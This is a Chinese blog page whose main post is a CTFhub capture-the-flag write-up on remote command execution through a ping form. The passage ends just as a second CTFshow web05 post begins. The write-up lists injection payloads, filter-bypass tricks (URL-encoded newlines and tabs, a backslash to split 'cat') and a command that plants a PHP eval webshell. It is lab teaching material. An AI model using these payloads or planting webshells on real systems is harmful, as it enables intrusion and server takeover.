<!DOCTYPE html>
<html lang="zh-cmn-Hans">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Willianir&#39;s home</title>
  
  
  
  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
  
<link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.3.0"></head>

<body>
<div class="Shell">
    <aside class='SideBar'>
    <section class='avatar' style="background-image: url()">
        <div class='av-pic' style="background-image: url()">
        </div>
    </section>
    <section class='menu'>
        <div>Willianir&#39;s home</div>
        
        <ul>
          
            <a href="/" class="Btn">
              <li>Home</li>
            </a>  
          
            <a href="/archives/" class="Btn">
              <li>Archive</li>
            </a>  
          
        </ul>
    </section>
    <section class="media">
        
    </section>
</aside>

    <div class="container">
        <div data-pager-shell>
            <ul class="Index">
  
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2021/06/05/CTFhub-RCE/">CTFhub-RCE</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2021-06-05T07:48:43.968Z" itemprop="datePublished">
    2021-06-05
  </time>
  
  
</div>

    </header>
    <div>
      
        <p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">




<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>在开始之前我们进行一些简单的了解，其实我也是做题做到后面才发现一些知识是必要去掌握的🧚‍♂️🧚‍♀️🧛‍♀️🧛‍♂️🧜‍♀️🧜‍♀️</p>
<p><strong>知识点-这里最好了解一下</strong><br>RCE分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：==没有在输入口做输入处理==。</p>
<ol>
<li>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。</li>
<li>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。</li>
<li>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</li>
</ol>
<p>其中对于不同系统的命令指示又有着不同的命令符：</p>
<h2 id="对于Windows系统"><a href="#对于Windows系统" class="headerlink" title="对于Windows系统"></a>对于Windows系统</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1.</span> “|”：直接执行后面的语句。<br><span class="hljs-number">2.</span> “||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。<br><span class="hljs-number">3.</span> “&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。<br><span class="hljs-number">4.</span> “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。<br></code></pre></td></tr></table></figure>
<h2 id="对于Linux系统"><a href="#对于Linux系统" class="headerlink" title="对于Linux系统"></a>对于Linux系统</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">. “;”：执行完前面的语句再执行后面的语句。<br>. “|”：显示后面语句的执行结果。<br>. “||”：当前面的语句执行出错时，执行后面的语句。<br>. “&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。<br>. “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。<br></code></pre></td></tr></table></figure>
<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p><img  src="https://img-blog.csdnimg.cn/20210531185857597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>既然提示输入IP让我们输入本地试试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.01</span><span class="hljs-number">.01</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531190028865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到显示后，尝试得到该路径下文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.01</span><span class="hljs-number">.01</span><span class="hljs-number">.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531190212498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>获取文件内容信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.01</span><span class="hljs-number">.01</span><span class="hljs-number">.1</span>&amp;cat <span class="hljs-number">120731029228103.</span>php<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531190322528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>没有结果，这里可能是文件中包含特殊符号，使用管道运行base64加密内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.01</span><span class="hljs-number">.01</span><span class="hljs-number">.1</span>&amp;cat *.php | base64<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/2021053119055310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<p>尝试base64解密<br><img  src="https://img-blog.csdnimg.cn/20210531190811336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>这里还有第二种方法，利用命令执行写入一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> &amp;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt;&gt; shell.php<br></code></pre></td></tr></table></figure>
<p>因为环境问题，昨天还可以今天就不行了，但是方法是可行的！👀👀</p>
<h1 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h1><p>本文开始前先贴出一些小知识：<br><strong>linux查看文本的命令</strong></p>
<ul>
<li><code>cat</code> 由第一行开始显示内容，并将所有内容输出</li>
<li><code>tac</code> 从最后一行倒序显示内容，并将所有内容输出</li>
<li><code>more</code> 根据窗口大小，一页一页的现实文件内容</li>
<li><code>less</code> 和<code>more</code>类似，但其优点可以往前翻页，而且进行可以搜索字符</li>
<li><code>head</code> 只显示头几行</li>
<li><code>tail</code> 只显示最后几行</li>
<li><code>nl</code> 类似于cat -n，显示时输出行号</li>
<li><code>tailf</code> 类似于tail -f</li>
</ul>
<p>==showtime==<br><img  src="https://img-blog.csdnimg.cn/20210531192646843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>根据上题的思路继续进行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531192723973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>检索目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531192752601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>先试试cat是否可以使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&amp;cat flag_30210295964775.php<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531192837961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>好吧看来是不行了<br>试试上一题讲到的一句话木马上传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> &amp;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt;&gt; shell.php<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531193315676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到flag<br><img  src="https://img-blog.csdnimg.cn/20210531193424176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><p><img  src="https://img-blog.csdnimg.cn/20210531193640916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>过滤空格可以使用<code>/**/</code> 或者<code>&lt;</code>代替</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-comment">/**/</span>&amp;<span class="hljs-comment">/**/</span>ls<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531193801505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>使用cat进行获取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-comment">/**/</span>&amp;<span class="hljs-comment">/**/</span>cat<span class="hljs-comment">/**/</span>flag_12333170278981.php<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531193941753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>没有结果，获取flag文件下base64密文</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>|cat&lt;flag_12333170278981.php|base64<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531194622505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>解密<img  src="https://img-blog.csdnimg.cn/20210531194653251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h1><p><img  src="https://img-blog.csdnimg.cn/20210531201230521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>解题思路：<br>1、既然<code>’/‘</code>无法使用那我们可以使用cd 进入文件夹中<br>2、对管道进行使用base64加密</p>
<p>按照惯例对题目文件目录进行查看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&amp;ls<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531201501482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>cd进入文件目录</strong><br>cd  进入flag_is_here目录，<br>ls  显示flag_is_here目录里的内容。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;cd flag_is_here;ls<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531201656332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>进入该文件中获取信息</strong><br>1、<code>cd</code> 进入文件<br>2、<code>cat</code> 获取文件内容<br>3、<code>base64</code>进行加密显示内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;cd flag_is_here;cat flag_11328226429806.php|base64<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531202030482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>进行解密<img  src="https://img-blog.csdnimg.cn/20210531202106484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h1><p><img  src="https://img-blog.csdnimg.cn/2021053120381879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<ol>
<li>这里过滤了，<code>|和&amp;</code>两个运算符，这两种运算符在这里是无法执行后面的命令</li>
<li>没事问题不大👩‍💻👩‍💻👨‍💻👨‍💻我们可以使用<code>；</code>分隔运算符进行命令</li>
</ol>
<p><strong>老样子，先检索目录吧</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;ls<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531204104432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>这就把flag文本文件展现了出来，那就cat 文本内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;cat flag_14322672312813.php<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210531204314488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>哇哦，flag呢😡😡😡😡不要急，这次我们不用base64对内容加密获取了,我们来看看文件的源码，看看藏在哪<img  src="https://img-blog.csdnimg.cn/20210531204454691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>这不是出来了<br>由于对<code>|</code>进行过滤了，直接对管道进行base64加密</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;base64 flag_14322672312813.php<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/2021053120532313.png"  ><span class="image-caption">在这里插入图片描述</span><br>进行解密<img  src="https://img-blog.csdnimg.cn/20210531205452687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h1><p>对于过滤情况的题，我发现了一个宝藏！！！<br><strong>url补充表</strong><br><img  src="https://img-blog.csdnimg.cn/2021060119342447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210601193431757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<p>接下来我们来进行解题吧<img  src="https://img-blog.csdnimg.cn/20210601193739236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到本题过滤了：<code>/ \ &amp; ; cat flag ctfhub</code>这些运算符<br>在本题中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、使用%<span class="hljs-number">0</span>a代替换行符<br><span class="hljs-number">2</span>、使用%<span class="hljs-number">09</span>a替代TABJ补充被过滤的flag<br><span class="hljs-number">3</span>、%<span class="hljs-number">5</span>c 代替 \（用 \ 来分隔开 cat ，因为 cat 也被过滤了）<br></code></pre></td></tr></table></figure>
<p>检索目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%<span class="hljs-number">0</span>als<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210601195338456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<p>进入到FLAG文件中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%<span class="hljs-number">0</span>als<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210601200159778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">这里%<span class="hljs-number">09</span>用于补充被过滤掉的flag<br></code></pre></td></tr></table></figure>
<p>接下看我们查看flag_324582491729512.php的内容信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%<span class="hljs-number">0</span>acd%<span class="hljs-number">09</span>*_is_here%<span class="hljs-number">0</span>aca%<span class="hljs-number">5</span>ct%<span class="hljs-number">09</span>*_324582491729512.php<br>在这里因为cat被过滤了因此需要%<span class="hljs-number">5</span>c将cat分隔开绕过过滤<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210601195957232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>查看源代码</p>
<p><img  src="https://img-blog.csdnimg.cn/20210601200740771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>或者直接对管道进行base64加密</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%<span class="hljs-number">0</span>acd%<span class="hljs-number">09</span>*_is_here%<span class="hljs-number">0</span>abase64%<span class="hljs-number">09</span>*_324582491729512.php<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210601201013998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>解密<img  src="https://img-blog.csdnimg.cn/20210601201052437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2021/06/05/CTFshow-web(5-6)/">CTFshow-web(5-6)</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2021-06-05T07:48:43.965Z" itemprop="datePublished">
    2021-06-05
  </time>
  
  
</div>

    </header>
    <div>
      
        <p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">


<h1 id="一、web05"><a href="#一、web05" class="headerlink" title="一、web05"></a>一、web05</h1><p><img  src="https://img-blog.csdnimg.cn/20210530195549600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>源码分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>    <br><span class="hljs-meta">?&gt;</span><br>&lt;html lang=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;<br><br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot;</span> /&gt;<br>    &lt;title&gt;ctf.show_web5&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;center&gt;<br>    &lt;h2&gt;ctf.show_web5&lt;/h2&gt;<br>    &lt;hr&gt;<br>    &lt;h3&gt;<br>    &lt;/center&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        MATHJAX-SSR<span 